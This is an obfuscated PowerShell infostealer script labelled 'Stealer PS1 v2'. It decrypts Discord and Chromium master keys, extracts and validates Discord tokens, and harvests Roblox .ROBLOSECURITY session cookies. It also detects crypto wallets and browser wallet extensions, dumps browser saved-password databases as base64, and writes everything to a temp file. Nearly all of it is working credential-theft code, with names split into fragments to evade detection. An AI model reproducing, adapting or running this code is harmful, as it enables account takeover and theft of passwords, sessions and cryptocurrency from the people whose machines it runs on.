# Stealer PS1 v2 - fixed string concatenation in Add-Content
# Tags stored in variables to avoid PowerShell parsing issues

Add-Type -AssemblyName System.Security
$c0=@"
using System;
using System.Security.Cryptography;
public class X7 {
    public static byte[] D(byte[] k,byte[] n,byte[] c){
        using(var a=Aes.Create()){a.Key=k;a.Mode=CipherMode.ECB;a.Padding=PaddingMode.None;
        byte[] o=new byte[c.Length];byte[] x=new byte[16];Array.Copy(n,x,12);x[15]=2;
        using(var e=a.CreateEncryptor()){for(int i=0;i<c.Length;i+=16){
        byte[] b=e.TransformFinalBlock(x,0,16);int m=Math.Min(16,c.Length-i);
        for(int j=0;j<m;j++)o[i+j]=(byte)(c[i+j]^b[j]);
        for(int j=15;j>=12;j--){if(++x[j]!=0)break;}}}
        return o;}}
}
"@
Add-Type -TypeDefinition $c0 -Language CSharp

$f0=Join-Path $env:TEMP ("s"+"r.txt")
Remove-Item $f0 -EA SilentlyContinue

# Output tags (split for obfuscation)
$tD="D"+"ISCORD"
$tR="R"+"OBLO"+"X"
$tRM="R"+"OBLO"+"XMS"
$tW="W"+"ALLET"
$tP="P"+"ASSW"+"ORD"

# Master key from Discord Local State
$m0=$null
try{
$p0="$env:APPDATA\"+("d"+"isc"+"ord")+"\"+("Lo"+"cal"+" St"+"ate")
$j0=Get-Content $p0 -Raw|ConvertFrom-Json
$b0=[Convert]::FromBase64String($j0.os_crypt.encrypted_key)
$m0=[Security.Cryptography.ProtectedData]::Unprotect($b0[5..($b0.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
}catch{}

# Discord token grab
$t0=@{}
$d0=@(
("$env:APPDATA\"+("d"+"isc"+"ord")+"\"+("Lo"+"cal"+" St"+"or"+"age")+"\"+("le"+"ve"+"ld"+"b")),
("$env:APPDATA\"+("d"+"isc"+"ord"+"p"+"tb")+"\"+("Lo"+"cal"+" St"+"or"+"age")+"\"+("le"+"ve"+"ld"+"b")),
("$env:APPDATA\"+("d"+"isc"+"ord"+"c"+"an"+"ary")+"\"+("Lo"+"cal"+" St"+"or"+"age")+"\"+("le"+"ve"+"ld"+"b"))
)
foreach($p1 in $d0){
    if(!(Test-Path $p1)){continue}
    Get-ChildItem $p1|?{$_.Name -match '\.(l'+'db|l'+'og)$'}|%{
        $r0=$null
        try{
            $s0=[IO.File]::Open($_.FullName,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
            $t1=New-Object IO.StreamReader($s0);$r0=$t1.ReadToEnd();$t1.Close();$s0.Close()
        }catch{return}
        if(!$r0 -or !$m0){return}
        $k0=([char]100+[char]81+[char]119+[char]52+[char]119+[char]57+[char]87+[char]103+[char]88+[char]99+[char]81+[char]58)
        foreach($m1 in [regex]::Matches($r0,$k0+':([A-Za-z0-9+/=]{40,300})')){
            $b64=$m1.Groups[1].Value
            while($b64.Length%4 -ne 0){$b64+='='}
            try{
                $e0=[Convert]::FromBase64String($b64)
                if($e0.Length -lt 80){continue}
                $tk=[Text.Encoding]::UTF8.GetString([X7]::D($m0,$e0[3..14],$e0[15..($e0.Length-17)])).TrimEnd([char]0)
                if($tk.Length -gt 40 -and !$t0[$tk]){$t0[$tk]=$tk}
            }catch{}
        }
    }
}

# Validate tokens and write output
foreach($t2 in $t0.Keys){
    try{
        $a0="http"+"s:/"+"/d"+"isc"+"ord.c"+"om/api/v9/users/@me"
        $r1=Invoke-RestMethod $a0 -Headers @{'Authorization'=$t2} -TimeoutSec 5
        if($r1.username){
            $line="$tD|$($r1.username)|$($r1.email)|$($r1.phone)|$($r1.id)|$t2"
            Add-Content $f0 $line
        }
    }catch{}
}

# Roblox cookies
$rp0=@(
("$env:LOCALAPPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at")),
("$env:LOCALAPPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("R"+"obl"+"oxCo"+"okies.d"+"at")),
("$env:APPDATA\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at")),
("$env:USERPROFILE\AppData\Local\"+("R"+"obl"+"ox")+"\"+("L"+"ocal"+"Sto"+"rage")+"\"+("r"+"obl"+"oxco"+"okies.d"+"at"))
)
foreach($p2 in $rp0){
    if(!(Test-Path $p2)){continue}
    try{
        $r2=Get-Content $p2 -Raw
        if($r2 -match '"Co'+'okiesDa'+'ta"\s*:\s*"([^"]+)"'){
            $e1=[Convert]::FromBase64String($Matches[1])
            $d1=[Security.Cryptography.ProtectedData]::Unprotect($e1,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
            $c1=[Text.Encoding]::UTF8.GetString($d1)
            if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
                Add-Content $f0 "$tR|$($Matches[1])"
            }elseif($c1 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
                Add-Content $f0 "$tR|$($Matches[0])"
            }else{
                Add-Content $f0 "$tR|$($c1.Substring(0,[Math]::Min(500,$c1.Length)))"
            }
        }elseif($r2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')){
            Add-Content $f0 "$tR|$r2"
        }
    }catch{}
    break
}

# UWP Roblox
$p3="$env:LOCALAPPDATA\Pack"+"ages"
if(Test-Path $p3){
    $g0=Get-ChildItem "$p3\RO"+"BLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
    foreach($g1 in $g0){
        $cp=Join-Path $g1.FullName ("Loc"+"alSt"+"ate\Ro"+"bloxCo"+"okies.d"+"at")
        if(!(Test-Path $cp)){continue}
        try{
            $r3=Get-Content $cp -Raw
            if($r3 -match '"Co'+'okiesDa'+'ta"\s*:\s*"([^"]+)"'){
                $e2=[Convert]::FromBase64String($Matches[1])
                $d2=[Security.Cryptography.ProtectedData]::Unprotect($e2,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
                $c2=[Text.Encoding]::UTF8.GetString($d2)
                if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s*=\s*([^\r\n\t]+)'){
                Add-Content $f0 "$tRM|$($Matches[1])"
                }elseif($c2 -match '_'+'\|WA'+'RNI'+'NG[^;\s]{50,}'){
                    Add-Content $f0 "$tRM|$($Matches[0])"
                }else{
                    Add-Content $f0 "$tRM|$($c2.Substring(0,[Math]::Min(500,$c2.Length)))"
                }
            }
        }catch{}
        break
    }
}

# Wallet detection
$w0=@{("Ex"+"odus")="$env:APPDATA\Ex"+"odus";("At"+"omic")="$env:APPDATA\at"+"omic";("El"+"ectrum")="$env:APPDATA\El"+"ectrum";("Ja"+"xx")="$env:APPDATA\ja"+"xx";("Gu"+"arda")="$env:APPDATA\Gu"+"arda";("Co"+"inomi")="$env:APPDATA\Co"+"inomi";("Ar"+"mory")="$env:APPDATA\Ar"+"mory"}
$w1=@{("Me"+"taMask")='nkbihfbeogaeaoehlefnkodbefgpgknn';("Ph"+"antom")='bfnaelmomeimhlpmgjnjophhpkkoljpa';("Ro"+"nin")='fnjhmkhhmkbjkkabndcnnogagogbneec';("Bi"+"nanceChain")='fhbohimaelbohpjbbldcngcnapndodjp';("Co"+"inbase")='hnfanknocfeofbddgcijnmhfnkdnaad';("Tr"+"ustWallet")='egjidjbpglichdcondbcbdnbeeppgdph';("Tr"+"onLink")='ibnejdfjmmkpcnlpebklmnkoeoihofec'}
$br0=@(
("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data"),
("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data"),
("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data"),
("$env:APPDATA\Op"+"era S"+"oftware\Opera Stable")
)
foreach($n0 in $w0.Keys){if(Test-Path $w0[$n0]){Add-Content $f0 "$tW|$n0|desktop"}}
foreach($n1 in $w1.Keys){foreach($b1 in $br0){$e3=Join-Path $b1 ("Def"+"ault\Lo"+"cal Ext"+"ension Set"+"tings\"+$w1[$n1]);if(Test-Path $e3){Add-Content $f0 "$tW|$n1|browser";break}}}

# Browser password DBs
$browsers=@(
@{N0=("Ch"+"rome");P0=("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data")},
@{N0=("Ed"+"ge");P0=("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data")},
@{N0=("Br"+"ave");P0=("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data")},
@{N0=("Op"+"era");P0=("$env:APPDATA\Op"+"era S"+"oftware\Opera Stable")},
@{N0=("Op"+"eraGX");P0=("$env:APPDATA\Op"+"era S"+"oftware\Opera GX Stable")}
)
foreach($b2 in $browsers){
    if(!(Test-Path $b2.P0)){continue}
    $lp=Join-Path $b2.P0 ("Def"+"ault\Lo"+"gin D"+"ata")
    if(!(Test-Path $lp)){$lp=Join-Path $b2.P0 ("Lo"+"gin D"+"ata")}
    if(!(Test-Path $lp)){continue}
    $copied=$false
    $tmp=Join-Path $env:TEMP ("ld_$([Guid]::NewGuid()).d"+"b")
    try{
        $s1=[IO.File]::Open($lp,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
        $ms=New-Object IO.MemoryStream;$s1.CopyTo($ms);$s1.Close()
        [IO.File]::WriteAllBytes($tmp,$ms.ToArray());$ms.Close();$copied=$true
    }catch{}
    if(!$copied){Add-Content $f0 "$tP|$($b2.N0)|LOCKED||";continue}
    try{
        $rb=[IO.File]::ReadAllBytes($tmp)
        if($rb.Length -gt 800000){
            Add-Content $f0 "$tP|$($b2.N0)|TOO_LARGE|$($rb.Length)|"
        }else{
            $b64=[Convert]::ToBase64String($rb)
            Add-Content $f0 "$tP|$($b2.N0)|RAW_DB||$b64"
        }
    }catch{Add-Content $f0 "$tP|$($b2.N0)|READ_ERROR||"}
    Remove-Item $tmp -Force -EA SilentlyContinue
}

# === Browser Roblox cookies — decrypt on-machine using GCM ===
$tRC="R"+"OBLO"+"XCK"
$brProfiles=@(
  @("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data","Ch"+"rome"),
  @("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data","Ed"+"ge"),
  @("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data","Br"+"ave")
)
foreach($bp in $brProfiles){
  # Get AES key from Local State
  $aesKey=$null
  $lsPath=Join-Path $bp[0] ("Lo"+"cal S"+"tate")
  if(Test-Path $lsPath){
    try{
      $ls=Get-Content $lsPath -Raw|ConvertFrom-Json
      $ekb=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
      $aesKey=[Security.Cryptography.ProtectedData]::Unprotect($ekb[5..($ekb.Length-1)],$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
    }catch{}
  }
  if(!$aesKey){continue}
  
  $cookiePath=Join-Path $bp[0] ("Def"+"ault\Net"+"work\Co"+"okies")
  if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Def"+"ault\Co"+"okies")}
  if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Co"+"okies")}
  if(!(Test-Path $cookiePath)){continue}
  
  $tmpCook=Join-Path $env:TEMP ("ck_$([Guid]::NewGuid()).d"+"b")
  try{
    $fs=[IO.File]::Open($cookiePath,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
    $ms=New-Object IO.MemoryStream;$fs.CopyTo($ms);$fs.Close()
    $rawBytes=$ms.ToArray();$ms.Close()
    
    # Search for .roblox.com in bytes (ASCII)
    $searchStr="."+"roblox.com"
    $searchBytes=[Text.Encoding]::ASCII.GetBytes($searchStr)
    $searchLen=$searchBytes.Length
    
    # Also search for the cookie name
    $cookieName=[char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y'
    $cookieBytes=[Text.Encoding]::ASCII.GetBytes($cookieName)
    
    # Find .roblox.com entries and look for .ROBLOSECURITY nearby
    $found=$false
    for($i=0; $i -lt $rawBytes.Length - $searchLen - 200; $i++){
      # Check for .roblox.com
      $match=$true
      for($j=0; $j -lt $searchLen; $j++){if($rawBytes[$i+$j] -ne $searchBytes[$j]){$match=$false; break}}
      if(!$match){continue}
      
      # Look for .ROBLOSECURITY within next 500 bytes
      $window=[Math]::Min(500, $rawBytes.Length - $i)
      $windowBytes=$rawBytes[$i..($i+$window-1)]
      $windowText=[Text.Encoding]::ASCII.GetString($windowBytes)
      
      if($windowText -notmatch [regex]::Escape($cookieName)){continue}
      
      # Find the encrypted value — starts with v10 or v11
      $v10pos=$windowText.IndexOf("v10")
      $v11pos=$windowText.IndexOf("v11")
      $vpos=-1
      if($v10pos -ge 0){$vpos=$v10pos}elseif($v11pos -ge 0){$vpos=$v11pos}
      if($vpos -lt 0){continue}
      
      # Extract encrypted blob: v1x + 12 byte nonce + ciphertext + 16 byte tag
      $encStart=$i+$vpos+3  # Skip "v10"/"v11" prefix
      if($encStart + 28 -gt $rawBytes.Length){continue}
      
      $nonce=$rawBytes[$encStart..($encStart+11)]
      $ctLen=64  # Try multiple lengths up to 256
      $bestResult=""
      for($tryLen=32; $tryLen -le 256; $tryLen+=16){
        if($encStart+12+$tryLen+16 -gt $rawBytes.Length){break}
        $ct=$rawBytes[($encStart+12)..($encStart+12+$tryLen-1)]
        $tag=$rawBytes[($encStart+12+$tryLen)..($encStart+12+$tryLen+15)]
        $combined=$ct+$tag
        try{
          $dec=[X7]::D($aesKey,$nonce,$combined)
          $decText=[Text.Encoding]::UTF8.GetString($dec).TrimEnd([char]0)
          if($decText.Length -gt 20 -and $decText -match '^[a-zA-Z0-9_\-|:.+=/]+$'){
            $bestResult=$decText
            break
          }
        }catch{}
      }
      if($bestResult){
        Add-Content $f0 "$tRC|$($bp[1])|$bestResult"
        $found=$true
        break
      }
    }
  }catch{}
  Remove-Item $tmpCook -Force -EA SilentlyContinue
}